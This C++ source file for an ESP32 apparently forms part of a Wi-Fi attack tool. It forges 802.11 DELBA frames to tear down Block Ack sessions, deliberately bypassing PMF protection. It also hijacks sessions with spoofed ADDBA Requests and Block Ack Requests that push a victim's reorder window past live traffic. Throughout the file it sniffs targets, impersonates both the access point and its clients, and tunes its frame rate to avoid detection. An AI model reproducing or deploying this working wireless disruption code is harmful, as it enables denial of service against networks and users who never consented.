// DELBA (Block Ack session teardown) spoofing.
//
// Design notes (why it is shaped this way):
//   * DELBA is category 3 (Block Ack), not one of the robust management frames,
//     so 802.11w/PMF does not verify it. That is why it still works where deauth
//     is dropped.
//   * A peer only acts on a DELBA for a TID it currently has a session on;
//     mac80211 (and every other driver) silently drops the rest. So sending
//     DELBA blind to every TID is mostly a no-op -- the useful trigger is the
//     ADDBA Request/Response that announces a session. The sniffer hands those
//     to a small queue and the main loop answers within a few ms.
//     Unicast management frames *are* delivered in promiscuous mode: a lab
//     re-association inside a monitor window showed auth=2 assoc=1 addba=7, and
//     the ADDBA-triggered path fired (delbtr>0). Block Ack / Block Ack Request
//     (control subtypes 9 / 8) only arrive when the *second-stage* sniffer filter
//     is open (start_promiscuous() sets WIFI_PROMIS_CTRL_FILTER_MASK_ALL; the
//     driver default drops every control frame), so the TID set is also learned
//     from the QoS control field of the client's data frames -- that sweep is the
//     safety net when an ADDBA is missed or the peer re-adds the session
//     silently.
//   * Both directions are forged: AP -> STA (the AP appears to tear down) and
//     STA -> AP (the client appears to tear it down). Either side dropping the
//     session is enough to lose A-MPDU aggregation.
//   * The periodic sweep exists because a client that gets its session torn down
//     keeps data flowing (it just falls back to single-frame ACKs) and re-sends
//     ADDBA when the driver decides it is worth it; repeating the teardown for
//     the TIDs already observed keeps aggregation off.

#include "delba.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"

namespace {

const uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// 802.11-2020 Table 9-92, the DELBA reasons a real peer actually uses.
//   1  = unspecified
//   32 = unspecified, QoS related
//   37 = requested from peer STA as it does not want to use the mechanism
//   38 = unspecified, QoS related (from the peer)
//   39 = the peer does not support the requested mechanism
const uint16_t kDefaultReason = 37;

const int kMaxClients = 8;
const int kMaxPending = 8;
// Repeat interval for one client (up to 8 TIDs, both directions) / for one
// blind group-addressed TID. 100 ms keeps the session from being usable again
// without turning into a frame flood that a channel-occupancy check would spot.
const uint32_t kSweepMs = 100;
// Sequence control of the frames we forge: same value CSA uses, i.e. a fixed
// non-zero sequence number rather than 0 (which looks like a retry of a frame
// nobody sent).
const uint8_t kSeqCtrlHigh = 0xF0;
const uint8_t kSeqCtrlLow = 0xFF;

bool s_active = false;
uint8_t s_bssid[6];
uint8_t s_channel;
uint16_t s_reason = kDefaultReason;

uint32_t s_frames;
uint32_t s_sweeps;
uint32_t s_addba_seen;
uint32_t s_bar_seen;  // BlockAck / BlockAckReq control frames seen
uint32_t s_triggered;
uint32_t s_blind;
uint32_t s_reverse;
uint32_t s_last_ms;
int s_cursor;

struct client_t {
    uint8_t mac[6];
    uint8_t tids;    // bitmap of TIDs announced by this client
    uint16_t sn[2];  // highest SN seen per direction: 0 = AP->STA, 1 = STA->AP
    uint16_t aim[2]; // SSN we last planted for that direction
};

// BA-session hijack state (DELBA -> forged ADDBA -> BAR).
//   dir 0 = downlink: we pretend to be the AP, so the *client's* reorder window
//           (WinStartB) is what gets moved.
//   dir 1 = uplink:   we pretend to be the client, so the *AP's* window moves.
bool s_ba_mode = false;
uint16_t s_ssn_step = 512;  // how far ahead of the live SN to plant the window
uint16_t s_last_ssn;
uint32_t s_ba_round;
uint32_t s_ba_addba_frames;
uint32_t s_ba_bar_frames;
uint32_t s_ba_delba_frames;
uint32_t s_ba_errors;      // frames the driver refused
int32_t s_ba_last_error;   // last esp_err_t from esp_wifi_80211_tx
const uint32_t kBaRoundMs = 40;   // one client per tick
const uint32_t kBaDelbaEvery = 5; // DELBA cadence (rounds): clean slate + preempt
const uint32_t kBaAddbaEvery = 25;  // ADDBA cadence (rounds): plant the window
const uint8_t kBaBufSize = 0;       // buffer size field 0 = 1 buffer (smallest)
// Injection budget. Each forged frame without a peer ACK occupies the driver's
// TX path for a while; firing the whole (client, TID, direction) matrix at once
// just returns ESP_ERR_NO_MEM (measured: 1559 refusals in 15 s). So a round
// sends at most this many frames and stops at the first refusal.
const uint32_t kBaFramesPerRound = 4;
uint32_t s_ba_pause_until;
// One-shot mode: send a couple of forged ADDBA frames (plant the window) and then
// stop transmitting entirely. Everything measured afterwards is *not* airtime
// starvation, which is the only way to tell a reorder-window hijack apart from a
// plain injection flood.
bool s_ba_oneshot;
bool s_ba_bar_only;   // one-shot sends only BARs (isolates the window update)
uint32_t s_ba_plant_frames;

client_t s_clients[kMaxClients];
int s_client_count;

// ADDBA -> DELBA hand-off. Written by the sniffer, drained by delba_step().
struct pending_t {
    uint8_t mac[6];
    uint8_t tid;
};

pending_t s_pending[kMaxPending];
volatile int s_pending_head = 0;  // producer (sniffer)
volatile int s_pending_tail = 0;  // consumer (main loop)

// DELBA action frame: 24 B header + category(3) + action(2) + parameter set +
// reason code.
//   DELBA Parameter Set: bit 11 = Initiator, bits 12..15 = TID.
// The initiator flag claims "I (the AP) am tearing the session down", which is
// exactly what a real AP sends when it stops aggregating.
size_t build_delba(uint8_t* frame, const uint8_t da[6], const uint8_t sa[6],
                   const uint8_t bssid[6], uint8_t tid, bool initiator, uint16_t reason) {
    memset(frame, 0, 32);
    frame[0] = 0xD0;  // management, subtype 13 = action
    frame[1] = 0x00;
    memcpy(frame + 4, da, 6);
    memcpy(frame + 10, sa, 6);
    memcpy(frame + 16, bssid, 6);
    frame[22] = kSeqCtrlHigh;
    frame[23] = kSeqCtrlLow;
    frame[24] = 3;  // category: block ack
    frame[25] = 2;  // action: DELBA
    uint16_t params = (uint16_t)((tid & 0x0F) << 12);
    if (initiator) {
        params = (uint16_t)(params | 0x0800);
    }
    frame[26] = (uint8_t)(params & 0xFF);
    frame[27] = (uint8_t)(params >> 8);
    frame[28] = (uint8_t)(reason & 0xFF);
    frame[29] = (uint8_t)(reason >> 8);
    return 30;
}

bool tx(uint8_t* frame, size_t len) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) != ESP_OK) {
        return false;
    }
    s_frames++;
    return true;
}

// AP -> STA: the AP appears to stop aggregating for that TID.
bool send_from_ap(const uint8_t sta[6], uint8_t tid) {
    uint8_t frame[32];
    const size_t len = build_delba(frame, sta, s_bssid, s_bssid, tid, true, s_reason);
    return tx(frame, len);
}

// STA -> AP: the client appears to tear its own session down. Covers stacks that
// filter DELBA "not sent by my AP" less strictly in this direction.
bool send_from_sta(const uint8_t sta[6], uint8_t tid) {
    uint8_t frame[32];
    const size_t len = build_delba(frame, s_bssid, sta, s_bssid, tid, true, s_reason);
    if (!tx(frame, len)) {
        return false;
    }
    s_reverse++;
    return true;
}

// Group-addressed DELBA: the only frame we can aim at "whoever is listening"
// before a client MAC is known. Most peers ignore it without a session, so it is
// a fallback that also proves the format on the air.
bool send_group(uint8_t tid) {
    uint8_t frame[32];
    const size_t len = build_delba(frame, kBroadcast, s_bssid, s_bssid, tid, true, s_reason);
    if (!tx(frame, len)) {
        return false;
    }
    s_blind++;
    return true;
}

int find_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

int note_client(const uint8_t* mac) {
    const int found = find_client(mac);
    if (found >= 0) {
        return found;
    }
    if (s_client_count >= kMaxClients) {
        return -1;  // keep the list stable: entries are never shifted out
    }
    memcpy(s_clients[s_client_count].mac, mac, 6);
    s_clients[s_client_count].tids = 0;
    return s_client_count++;
}

void enqueue_pending(const uint8_t* mac, uint8_t tid) {
    const int next = (s_pending_head + 1) % kMaxPending;
    if (next == s_pending_tail) {
        return;  // queue full: the sweep covers it
    }
    memcpy(s_pending[s_pending_head].mac, mac, 6);
    s_pending[s_pending_head].tid = tid;
    s_pending_head = next;
}

// Counts frames of the target BSS once so the sweep loops know which TIDs are
// worth mentioning.
uint8_t sweep_mask(const client_t* c) {
    return c->tids != 0 ? c->tids : 0xFF;  // nothing learned yet: try every TID
}

// ADDBA Request: 24 B header + category(3) + action(0) + dialog token +
// Block Ack Parameter Set + Block Ack Timeout + Block Ack Starting Sequence
// Control. The SSN field is the whole point: a recipient initialises WinStartB
// from it (802.11-2020 10.25.6.6), so a value far ahead of the live traffic
// plants the window where real frames can never reach it.
size_t build_addba_req(uint8_t* frame, const uint8_t da[6], const uint8_t sa[6], uint8_t tid,
                       uint16_t ssn, uint8_t dialog) {
    memset(frame, 0, 40);
    frame[0] = 0xD0;  // management, subtype 13 = action
    frame[1] = 0x00;
    memcpy(frame + 4, da, 6);
    memcpy(frame + 10, sa, 6);
    memcpy(frame + 16, s_bssid, 6);
    frame[22] = kSeqCtrlHigh;
    frame[23] = kSeqCtrlLow;
    frame[24] = 3;  // category: block ack
    frame[25] = 0;  // action: ADDBA request
    frame[26] = dialog;
    const uint16_t params = (uint16_t)(((tid & 0x0F) << 2) | ((kBaBufSize & 0x3FF) << 6) | 0x0002);
    frame[27] = (uint8_t)(params & 0xFF);
    frame[28] = (uint8_t)(params >> 8);
    frame[29] = 0;  // timeout 0
    frame[30] = 0;
    const uint16_t ssc = (uint16_t)((ssn & 0x0FFF) << 4);
    frame[31] = (uint8_t)(ssc & 0xFF);
    frame[32] = (uint8_t)(ssc >> 8);
    return 33;
}

// Compressed Block Ack Request (control subtype 8): FC + duration + RA + TA +
// BAR control + BAR information (starting sequence control).
//   BAR control: bit1 multi-TID, bit2 compressed bitmap, bits4..7 TID
//   BAR info   : bits 4..15 = starting sequence number, bits 0..3 = fragment 0
size_t build_bar(uint8_t* frame, const uint8_t ra[6], const uint8_t ta[6], uint8_t tid,
                 uint16_t ssn) {
    memset(frame, 0, 24);
    frame[0] = 0x84;  // control, subtype 8 = block ack request
    frame[1] = 0x00;
    memcpy(frame + 4, ra, 6);
    memcpy(frame + 10, ta, 6);
    const uint16_t ctrl = (uint16_t)(((tid & 0x0F) << 4) | 0x0004);
    frame[16] = (uint8_t)(ctrl & 0xFF);
    frame[17] = (uint8_t)(ctrl >> 8);
    const uint16_t ssc = (uint16_t)((ssn & 0x0FFF) << 4);
    frame[18] = (uint8_t)(ssc & 0xFF);
    frame[19] = (uint8_t)(ssc >> 8);
    return 20;
}

bool ba_tx(uint8_t* frame, size_t len, uint32_t* counter) {
    const esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    if (err != ESP_OK) {
        s_ba_errors++;
        s_ba_last_error = (int32_t)err;
        return false;
    }
    s_frames++;
    if (counter != nullptr) {
        (*counter)++;
    }
    return true;
}

// Tracks the highest SN a direction has reached, in 12-bit sequence space.
void note_sn(client_t* c, int dir, uint16_t sn) {
    if (((sn - c->sn[dir]) & 0x0FFF) < 0x0800) {
        c->sn[dir] = (uint16_t)(sn & 0x0FFF);
    }
}

// Plants the receive window of the peer that owns direction `dir`.
bool ba_plant(int dir, const uint8_t mac[6], client_t* c, uint8_t tid) {
    uint8_t frame[40];
    const uint16_t aim = (uint16_t)((c->sn[dir] + s_ssn_step) & 0x0FFF);
    c->aim[dir] = aim;
    s_last_ssn = aim;
    // dir 0: pretend to be the AP -> the client's WinStartB moves.
    // dir 1: pretend to be the client -> the AP's WinStartB moves.
    const size_t len = dir == 0
                           ? build_addba_req(frame, mac, s_bssid, tid, aim, (uint8_t)(s_ba_round & 0xFF))
                           : build_addba_req(frame, s_bssid, mac, tid, aim, (uint8_t)(s_ba_round & 0xFF));
    return ba_tx(frame, len, &s_ba_addba_frames);
}

// Pushes that window forward again (and keeps it ahead as real SNs advance).
bool ba_push(int dir, const uint8_t mac[6], client_t* c, uint8_t tid) {
    uint8_t frame[24];
    const uint16_t ssn = (uint16_t)((c->sn[dir] + s_ssn_step) & 0x0FFF);
    s_last_ssn = ssn;
    const size_t len = dir == 0 ? build_bar(frame, mac, s_bssid, tid, ssn)
                                : build_bar(frame, s_bssid, mac, tid, ssn);
    return ba_tx(frame, len, &s_ba_bar_frames);
}

// One (client, TID) slice of the BA-session hijack. Called from delba_step()
// with one client per round.
void ba_round_client(client_t* c) {
    const uint8_t mask = sweep_mask(c);
    uint32_t budget = kBaFramesPerRound;
    for (int dir = 0; dir < 2; dir++) {
        for (uint8_t tid = 0; tid < 8; tid++) {
            if ((mask & (1u << tid)) == 0) {
                continue;
            }
            if (budget == 0) {
                return;
            }
            if (s_ba_round % kBaDelbaEvery == 0) {
                // Step 1: tear the real session down, so the peer accepts our
                // ADDBA instead of rejecting it as a duplicate session.
                uint8_t frame[32];
                const size_t len = dir == 0
                                       ? build_delba(frame, c->mac, s_bssid, s_bssid, tid, true, s_reason)
                                       : build_delba(frame, s_bssid, c->mac, s_bssid, tid, true, s_reason);
                if (!ba_tx(frame, len, &s_ba_delba_frames)) {
                    s_ba_pause_until = millis() + 5;
                    return;
                }
                budget--;
            }
            if (s_ba_round % kBaAddbaEvery == 0 && budget > 0) {
                // Step 2: recreate it ourselves with an SSN of our choosing.
                if (!ba_plant(dir, c->mac, c, tid)) {
                    s_ba_pause_until = millis() + 5;
                    return;
                }
                budget--;
            }
            // Step 3: keep pushing WinStartB past the live sequence numbers.
            if (!ba_push(dir, c->mac, c, tid)) {
                s_ba_pause_until = millis() + 5;
                return;
            }
            budget--;
        }
    }
}

}  // namespace

bool delba_start(int index, uint16_t reason) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    if (!delba_reason_is_defined(reason)) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = (uint8_t)WiFi.channel(index);
    s_reason = reason;
    s_frames = 0;
    s_sweeps = 0;
    s_addba_seen = 0;
    s_bar_seen = 0;
    s_triggered = 0;
    s_blind = 0;
    s_reverse = 0;
    s_client_count = 0;
    s_cursor = 0;
    s_pending_head = 0;
    s_pending_tail = 0;
    s_last_ms = millis();

    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    // The receive callback is what makes the ADDBA-triggered path possible: with
    // promiscuous mode on but no callback the radio hears nothing and the attack
    // silently degrades to blind group-addressed DELBA.
    attack_sniffer_enable();
    s_active = true;
    return true;
}

void delba_stop(void) {
    s_active = false;
    s_ba_mode = false;
}

void delba_step(void) {
    if (!s_active) {
        return;
    }

    // Precise path first: these sessions were just announced, so the DELBA lands
    // while the peer still has the (client, TID) state installed.
    while (s_pending_tail != s_pending_head) {
        uint8_t mac[6];
        const uint8_t tid = s_pending[s_pending_tail].tid;
        memcpy(mac, s_pending[s_pending_tail].mac, 6);
        s_pending_tail = (s_pending_tail + 1) % kMaxPending;
        if (send_from_ap(mac, tid)) {
            s_triggered++;
        }
    }

    const uint32_t now = millis();

    if (s_ba_mode) {
        if (s_ba_oneshot) {
            if (s_client_count == 0) {
                return;  // wait until the sniffer knows a client
            }
            if ((int32_t)(now - s_ba_pause_until) < 0) {
                return;
            }
            uint32_t budget = 8;
            for (int i = 0; i < s_client_count && budget > 0; i++) {
                client_t* c = &s_clients[i];
                const uint8_t mask = sweep_mask(c);
                for (int dir = 0; dir < 2; dir++) {
                    for (uint8_t tid = 0; tid < 8; tid++) {
                        if ((mask & (1u << tid)) == 0 || budget == 0) {
                            continue;
                        }
                        // bar_only: no ADDBA, no DELBA -- only the BAR that walks
                        // WinStartB. That is the one frame the standard lets a
                        // receiver use to move its window, so an effect here cannot
                        // be blamed on session churn.
                        const bool ok = s_ba_bar_only ? ba_push(dir, c->mac, c, tid)
                                                      : ba_plant(dir, c->mac, c, tid);
                        if (!ok) {
                            s_ba_pause_until = millis() + 5;
                            return;
                        }
                        s_ba_plant_frames++;
                        budget--;
                    }
                }
            }
            s_ba_oneshot = false;  // window planted; stay silent from here on
            return;
        }
        if (now - s_last_ms < kBaRoundMs) {
            return;
        }
        if ((int32_t)(now - s_ba_pause_until) < 0) {
            return;  // driver's TX queue is full: let it drain instead of hammering
        }
        s_last_ms = now;
        s_ba_round++;
        if (s_client_count == 0) {
            // Nothing learned yet: a group BAR is the only thing we can aim at
            // anybody (TID from the round counter, SSN = step size).
            uint8_t frame[24];
            const uint8_t tid = (uint8_t)(s_ba_round & 0x07);
            const uint16_t ssn = (uint16_t)(((s_ba_round * s_ssn_step) + s_ssn_step) & 0x0FFF);
            if (!ba_tx(frame, build_bar(frame, kBroadcast, s_bssid, tid, ssn), &s_ba_bar_frames)) {
                s_ba_pause_until = millis() + 5;
            }
            return;
        }
        client_t* c = &s_clients[s_cursor];
        s_cursor = (s_cursor + 1) % s_client_count;
        ba_round_client(c);
        return;
    }

    if (now - s_last_ms < kSweepMs) {
        return;
    }
    s_last_ms = now;
    s_sweeps++;

    if (s_client_count == 0) {
        send_group((uint8_t)(s_sweeps & 0x07));
        return;
    }

    const client_t* c = &s_clients[s_cursor];
    s_cursor = (s_cursor + 1) % s_client_count;
    const uint8_t mask = sweep_mask(c);
    for (uint8_t tid = 0; tid < 8; tid++) {
        if ((mask & (1u << tid)) == 0) {
            continue;
        }
        send_from_ap(c->mac, tid);
        send_from_sta(c->mac, tid);
    }
}

void delba_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    // 16 bytes covers RA/TA, which is all a BlockAck Request carries -- the old
    // 24 byte gate threw every BAR away before its TID was ever looked at.
    if (!s_active || len < 16) {
        return;
    }
    const uint8_t* dest = frame + 4;
    const uint8_t* src = frame + 10;
    // Control frames have no Addr3: bytes 16..21 there are BA control + bitmap.
    const bool has_addr3 = (type != 1) && len >= 22;
    const bool on_target = memcmp(src, s_bssid, 6) == 0 || memcmp(dest, s_bssid, 6) == 0 ||
                           (has_addr3 && memcmp(frame + 16, s_bssid, 6) == 0);
    if (!on_target) {
        return;
    }

    // The peer is whichever address is not the AP.
    const uint8_t* peer = memcmp(src, s_bssid, 6) == 0 ? dest : src;
    if (memcmp(peer, kBroadcast, 6) == 0 || memcmp(peer, s_bssid, 6) == 0) {
        return;
    }
    if ((peer[0] & 0x01) != 0) {
        return;  // multicast
    }
    const int idx = note_client(peer);
    if (idx < 0) {
        return;
    }

    // A QoS data frame names its TID right in the header. ADDBA is the more
    // precise source (it fires this module immediately), but data frames keep
    // arriving for as long as the client streams, so the sweep also stays narrow
    // instead of spraying all 8 TIDs.
    if (type == 2 && (subtype & 0x08) != 0 && len >= 26) {
        const uint8_t tid = (uint8_t)(frame[24] & 0x0F);
        s_clients[idx].tids = (uint8_t)(s_clients[idx].tids | (1u << (tid & 0x07)));
        // Where is this direction's sequence number now? That is what the forged
        // SSN has to stay ahead of.
        const uint16_t seq = (uint16_t)(frame[22] | (frame[23] << 8));
        const uint16_t sn = (uint16_t)((seq >> 4) & 0x0FFF);
        note_sn(&s_clients[idx], memcmp(frame + 10, s_bssid, 6) == 0 ? 0 : 1, sn);
    }

    // Block Ack Request (control subtype 8) / Block Ack (control subtype 9):
    // the BA Control field sits at offset 16 and carries the TID in bits 2..5.
    // A BA on the air only exists while a session is live, so this is the most
    // direct TID source there is. It needs the second-stage sniffer filter that
    // start_promiscuous() sets (driver default: no control frames at all).
    // (subtype 11 is RTS and 12 is CTS -- they are *not* block ack frames.)
    if (type == 1 && (subtype == 8 || subtype == 9) && len >= 18) {
        const uint16_t ba_ctrl = (uint16_t)(frame[16] | (frame[17] << 8));
        const uint8_t tid = (uint8_t)((ba_ctrl >> 2) & 0x0F);
        s_clients[idx].tids = (uint8_t)(s_clients[idx].tids | (1u << (tid & 0x07)));
        s_bar_seen++;
        return;
    }

    // Only ADDBA Request (action 0) / Response (action 1) matter here: they are
    // the only frames that tell us a session exists (and for which TID).
    if (type != 0 || subtype != 13 || len < 31) {
        return;
    }
    if (frame[24] != 3) {
        return;  // not the block ack category
    }
    const uint8_t action = frame[25];
    uint8_t tid;
    if (action == 0) {
        // ADDBA Request: cat, action, dialog token, parameter set, timeout.
        const uint16_t params = (uint16_t)(frame[27] | (frame[28] << 8));
        tid = (uint8_t)((params >> 2) & 0x0F);
    } else if (action == 1) {
        // ADDBA Response carries a status code before the parameter set: a
        // declined response means no session was created, so do not answer it.
        const uint16_t status = (uint16_t)(frame[27] | (frame[28] << 8));
        if (status != 0) {
            return;
        }
        if (len < 33) {
            return;
        }
        const uint16_t params = (uint16_t)(frame[29] | (frame[30] << 8));
        tid = (uint8_t)((params >> 2) & 0x0F);
    } else {
        return;
    }
    s_addba_seen++;
    s_clients[idx].tids = (uint8_t)(s_clients[idx].tids | (1u << (tid & 0x07)));
    enqueue_pending(peer, tid);
}

void delba_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    uint8_t frame[32];

    Serial.print("DELBATEST reason=");
    Serial.println((unsigned)s_reason);
    for (uint8_t tid = 0; tid < 8; tid += 3) {  // 0 and 3 and 6
        const size_t len =
            build_delba(frame, fake_sta, s_bssid, s_bssid, tid, true, s_reason);
        const uint16_t params = (uint16_t)(frame[26] | (frame[27] << 8));
        Serial.printf("DELBATEST ap_to_sta len=%u cat=%u act=%u tid=%u init=%u reason=%u hex=",
                      (unsigned)len, (unsigned)frame[24], (unsigned)frame[25],
                      (unsigned)((params >> 12) & 0x0F), (unsigned)((params >> 11) & 0x01),
                      (unsigned)(frame[28] | (frame[29] << 8)));
        for (size_t i = 0; i < len; i++) {
            Serial.printf("%02X", frame[i]);
        }
        Serial.println();
    }
    const size_t rlen = build_delba(frame, s_bssid, fake_sta, s_bssid, 0, true, s_reason);
    Serial.print("DELBATEST sta_to_ap hex=");
    for (size_t i = 0; i < rlen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
}

bool delba_start_ba(int index, uint16_t ssn_step) {
    if (ssn_step > 2047) {
        return false;  // must stay inside the standard's WinStartB + 2^11 window
    }
    // step < 128 is the control condition: the SSN still gets written, but it
    // stays inside the current reorder window, so nothing is pushed out.
    if (!delba_start(index, kDefaultReason)) {
        return false;
    }
    s_ba_mode = true;
    s_ssn_step = ssn_step;
    s_ba_round = 0;
    s_ba_addba_frames = 0;
    s_ba_bar_frames = 0;
    s_ba_delba_frames = 0;
    s_ba_errors = 0;
    s_ba_last_error = 0;
    s_last_ssn = 0;
    return true;
}

bool delba_ba_mode(void) {
    return s_ba_mode;
}

// Plant the reorder window(s) once and go silent (see s_ba_oneshot).
bool delba_ba_plant_once(int index, uint16_t ssn_step) {
    if (!delba_start_ba(index, ssn_step)) {
        return false;
    }
    s_ba_oneshot = true;
    s_ba_bar_only = false;
    s_ba_plant_frames = 0;
    s_ba_round = 0;
    return true;
}

// Same one-shot pass but with BAR frames only: isolates "the receiver moved its
// reorder window" from "the session state was rewritten".
bool delba_ba_bar_once(int index, uint16_t ssn_step) {
    if (!delba_ba_plant_once(index, ssn_step)) {
        return false;
    }
    s_ba_bar_only = true;
    return true;
}

uint32_t delba_ba_planted_frames(void) {
    return s_ba_plant_frames;
}

uint32_t delba_ba_addba_frames(void) {
    return s_ba_addba_frames;
}

uint32_t delba_ba_bar_frames(void) {
    return s_ba_bar_frames;
}

uint32_t delba_ba_delba_frames(void) {
    return s_ba_delba_frames;
}

uint16_t delba_ba_last_ssn(void) {
    return s_last_ssn;
}

uint32_t delba_ba_errors(void) {
    return s_ba_errors;
}

int32_t delba_ba_last_error(void) {
    return s_ba_last_error;
}

// Debug helper: send one of each forged frame to `mac` and report the driver's
// verdict for every one of them. This is how "why is baaddba still 0" gets
// answered without guessing.
void delba_ba_tx_probe(const uint8_t mac[6]) {
    uint8_t frame[40];
    s_ba_errors = 0;
    s_ba_last_error = 0;

    size_t len = build_delba(frame, mac, s_bssid, s_bssid, 0, true, s_reason);
    esp_err_t e1 = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);

    len = build_addba_req(frame, mac, s_bssid, 0, 1175, 1);
    esp_err_t e2 = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);

    len = build_bar(frame, mac, s_bssid, 0, 1175);
    esp_err_t e3 = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);

    Serial.printf("BATX delba(30B)=%d addba(33B)=%d bar(20B)=%d\n", (int)e1, (int)e2, (int)e3);
}

// Dumps one forged ADDBA Request and one forged BAR with decoded fields, so the
// layout can be compared against 802.11-2020 / mac80211 without a second radio.
void delba_ba_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    uint8_t frame[40];
    const uint16_t ssn = 1175;

    const size_t alen = build_addba_req(frame, s_bssid, fake_sta, 5, ssn, 7);
    const uint16_t params = (uint16_t)(frame[27] | (frame[28] << 8));
    const uint16_t ssc = (uint16_t)(frame[31] | (frame[32] << 8));
    Serial.printf("BATEST addba len=%u cat=%u act=%u tid=%u buf=%u ssn=%u hex=",
                  (unsigned)alen, (unsigned)frame[24], (unsigned)frame[25],
                  (unsigned)((params >> 2) & 0x0F), (unsigned)((params >> 6) & 0x3FF),
                  (unsigned)(ssc >> 4));
    for (size_t i = 0; i < alen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    const size_t blen = build_bar(frame, s_bssid, fake_sta, 5, ssn);
    const uint16_t ctrl = (uint16_t)(frame[16] | (frame[17] << 8));
    const uint16_t bssc = (uint16_t)(frame[18] | (frame[19] << 8));
    Serial.printf("BATEST bar len=%u subtype=%u tid=%u compressed=%u ssn=%u hex=",
                  (unsigned)blen, (unsigned)((frame[0] >> 4) & 0x0F), (unsigned)((ctrl >> 4) & 0x0F),
                  (unsigned)((ctrl >> 2) & 0x01), (unsigned)(bssc >> 4));
    for (size_t i = 0; i < blen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
}

bool delba_active(void) {
    return s_active;
}

bool delba_reason_is_defined(uint16_t code) {
    return code == 1 || code == 32 || code == 37 || code == 38 || code == 39;
}

uint32_t delba_frames(void) {
    return s_frames;
}

uint32_t delba_clients(void) {
    return (uint32_t)s_client_count;
}

uint8_t delba_tid_mask(void) {
    uint8_t mask = 0;
    for (int i = 0; i < s_client_count; i++) {
        mask = (uint8_t)(mask | s_clients[i].tids);
    }
    return mask;
}

uint32_t delba_addba_seen(void) {
    return s_addba_seen;
}

uint32_t delba_bar_seen(void) {
    return s_bar_seen;
}

uint32_t delba_triggered(void) {
    return s_triggered;
}

uint32_t delba_blind_frames(void) {
    return s_blind;
}

uint32_t delba_reverse_frames(void) {
    return s_reverse;
}

uint32_t delba_sweeps(void) {
    return s_sweeps;
}

uint8_t delba_channel(void) {
    return s_channel;
}

uint16_t delba_reason(void) {
    return s_reason;
}
